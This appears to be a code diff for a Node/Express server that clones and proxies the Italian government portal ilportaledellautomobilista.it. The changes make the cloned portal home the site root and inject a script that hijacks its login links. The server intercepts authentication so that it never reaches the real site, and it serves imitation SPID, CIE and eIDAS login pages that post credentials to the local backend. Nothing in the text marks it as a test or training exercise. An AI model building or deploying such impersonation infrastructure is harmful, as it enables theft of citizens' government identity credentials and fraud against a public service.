@@ -507,7 +507,7 @@ function go(){
     if(d.success){
       localStorage.setItem('token',d.token);
       localStorage.setItem('user',JSON.stringify(d.user));
-      location.href='/frontend/dashboard.html';
+      location.href='/dashboard.html';
     }else{
       e.textContent=d.message||"Errore durante l'accesso.";
       e.className+=' show';btn.disabled=false;btn.textContent='Accedi';
@@ -655,7 +655,7 @@ input[type=text]:focus,input[type=email]:focus{outline:2px solid ${c.inputFocus}
       <button class="btn-login" id="btn" onclick="go()">Accedi</button>
       <div class="card-links">
         <a href="#" onclick="return false;">Hai dimenticato le credenziali?</a>
-        <a href="/frontend/login.html">&larr; Indietro</a>
+        <a href="/login.html">&larr; Indietro</a>
       </div>
     </div>
     <div class="card-footer">
@@ -777,7 +777,7 @@ footer a:hover{text-decoration:underline}
         <button class="btn-accedi" id="btn" onclick="go()">Accedi</button>
         <div class="form-links">
           <a href="#" onclick="return false;">Hai dimenticato le credenziali?</a>
-          <a href="/frontend/login.html">&larr; Cambio provider</a>
+          <a href="/login.html">&larr; Cambio provider</a>
         </div>
       </div>
     </div>
@@ -1054,7 +1054,7 @@ body{font-family:'Titillium Web',Roboto,Arial,sans-serif;background:#f5f7fa;min-
       if(d.success){
         localStorage.setItem('token',d.token);
         localStorage.setItem('user',JSON.stringify(d.user));
-        location.href='/frontend/dashboard.html';
+        location.href='/dashboard.html';
       } else {
         err.textContent=d.message||"Errore durante l'accesso.";
         err.className='cie-err show';
@@ -1323,7 +1323,7 @@ footer img{max-height:40px;opacity:.7}
       if(d.success){
         localStorage.setItem('token', d.token);
         localStorage.setItem('user', JSON.stringify(d.user));
-        location.href = '/frontend/dashboard.html';
+        location.href = '/dashboard.html';
       } else {
         err.textContent = d.message || "Errore durante l'accesso.";
         err.className = 'eidas-err show';
@@ -1389,7 +1389,7 @@ const fs = require('fs');
 
 const REAL_SITE   = 'https://www.ilportaledellautomobilista.it';
 const LOCAL       = `http://localhost:${PORT}`;
-const LOGIN_PAGE  = '/frontend/login.html';
+const LOGIN_PAGE  = '/login.html';
 
 // Auth patterns — any request matching these never reaches the real site.
 // loginspid and the SSO selection page (/SSO/SSOLogin/) are excluded:
@@ -1406,7 +1406,28 @@ const AUTH_RE = [
 
 // ── Our own frontend pages (served locally) ──────────────────────────────────
 const ROOT = path.join(__dirname, '..');
+
+// ── Cloned portal home (served with GUARD injected so auth interception works)
+const CLONE_HOME = path.join(ROOT, 'ilportaledellautomobilista/www.ilportaledellautomobilista.it/web/portale-automobilista.html');
+const BASE_TAG = '<base href="/ilportaledellautomobilista/www.ilportaledellautomobilista.it/web/">';
+function serveCloneHome(_req, res) {
+  let html = fs.readFileSync(CLONE_HOME, 'utf8');
+  // Rewrite absolute real-site URLs to stay on our server
+  html = html.replace(new RegExp(REAL_SITE.replace(/\./g, '\\.'), 'g'), LOCAL);
+  // Inject base tag so relative asset paths (../pda-theme/, ../html/, etc.) resolve correctly
+  html = html.replace(/(<head[^>]*>)/i, '$1' + BASE_TAG);
+  // Inject GUARD for auth interception
+  html = html.replace(/(<head[^>]*>)/i, '$1' + GUARD);
+  html = html.includes('</body>') ? html.replace('</body>', GUARD + '</body>') : html + GUARD;
+  res.setHeader('Content-Type', 'text/html; charset=utf-8');
+  res.send(html);
+}
+app.get('/', serveCloneHome);
+app.get('/home.html', serveCloneHome);
+
+// Serve frontend pages at /frontend/ (compat) and root
 app.use('/frontend', express.static(path.join(ROOT, 'frontend')));
+app.use(express.static(path.join(ROOT, 'frontend')));
 // Serve cloned portal assets (CSS, images) referenced by dashboard.html
 app.use('/ilportaledellautomobilista', express.static(path.join(ROOT, 'ilportaledellautomobilista')));
 
@@ -1439,7 +1460,7 @@ const GUARD = `<script>
      Solution: hide #login entirely and insert a SIBLING <div id="__pda-auth-bar">
      next to it. Liferay re-renders #login all it wants — our sibling is untouched.
      A 200ms poll runs for 6s to cover all delayed portlet AJAX loads.          */
-  window.__pdaHome   = function(){ location.href='/frontend/dashboard.html'; };
+  window.__pdaHome   = function(){ location.href='/dashboard.html'; };
   window.__pdaLogout = function(){
     localStorage.removeItem('token'); localStorage.removeItem('user');
     location.href='/web/portale-automobilista';
@@ -1483,7 +1504,7 @@ const GUARD = `<script>
         +'</div>'
         +'<div style="float:right;display:flex;align-items:center;gap:5px;margin:4px 10px 0 0">'
           +'<button onclick="__pdaHome()" style="'+BTN+';background:linear-gradient(to bottom,#2e8ae0 0%,#1262b8 100%);border-color:#0c52a0">&#8962; HOME</button>'
-          +'<button onclick="location.href=\'/frontend/dashboard.html#profilo\'" style="'+BTN+';background:linear-gradient(to bottom,#5a90c8 0%,#3a6fa8 100%)">PROFILO</button>'
+          +'<button onclick="location.href=\'/dashboard.html#profilo\'" style="'+BTN+';background:linear-gradient(to bottom,#5a90c8 0%,#3a6fa8 100%)">PROFILO</button>'
           +'<button onclick="__pdaLogout()" style="'+BTN+';background:linear-gradient(to bottom,#999 0%,#6e6e6e 100%);border-color:#555">ESCI</button>'
         +'</div>'
         +'<div style="clear:both"></div>';
@@ -1521,8 +1542,8 @@ const GUARD = `<script>
       bar.id='__pda-guest-bar';
       bar.style.cssText='float:right;min-width:514px;height:36px;background-color:#444646;box-sizing:border-box;display:flex;align-items:center;justify-content:flex-end;padding:0 10px;gap:6px';
       bar.innerHTML=
-        '<a href="/frontend/login.html" style="'+BTN+';background:linear-gradient(to bottom,#2e8ae0 0%,#1262b8 100%);border-color:#0c52a0;color:#fff">ACCEDI AL PORTALE</a>'
-        +'<a href="/frontend/login.html" style="'+BTN+';background:linear-gradient(to bottom,#5a90c8 0%,#3a6fa8 100%);color:#fff">Iscriviti</a>';
+        '<a href="/login.html" style="'+BTN+';background:linear-gradient(to bottom,#2e8ae0 0%,#1262b8 100%);border-color:#0c52a0;color:#fff">ACCEDI AL PORTALE</a>'
+        +'<a href="/login.html" style="'+BTN+';background:linear-gradient(to bottom,#5a90c8 0%,#3a6fa8 100%);color:#fff">Iscriviti</a>';
       login.parentNode.insertBefore(bar,login);
     }
     if(document.readyState==='loading') document.addEventListener('DOMContentLoaded',injectGuest);
@@ -1557,7 +1578,7 @@ const GUARD = `<script>
       set:function(u){
         if(!bad(String(u))) return _hDesc.set.call(this,u);
         if(typeof window.__ourModal==='function'&&window.__ourModal()) return;
-        _hDesc.set.call(this,'/frontend/login.html');
+        _hDesc.set.call(this,'/login.html');
       },
       configurable:true
     });
@@ -1710,7 +1731,7 @@ const LOGINSPID_MODAL = `
       if(d.success){
         localStorage.setItem('token',d.token);
         localStorage.setItem('user',JSON.stringify(d.user));
-        window.location.href='/frontend/dashboard.html';
+        window.location.href='/dashboard.html';
       } else {
         err.textContent=d.message||'Errore durante l\'accesso.';
         err.className='show'; err.style.display='block';
@@ -1784,7 +1805,7 @@ app.use('/', createProxyMiddleware({
       return html;
     }),
     error: (_err, _req, res) => {
-      res.writeHead(302, { location: '/frontend/dashboard.html' });
+      res.writeHead(302, { location: '/dashboard.html' });
       res.end();
     },
   },
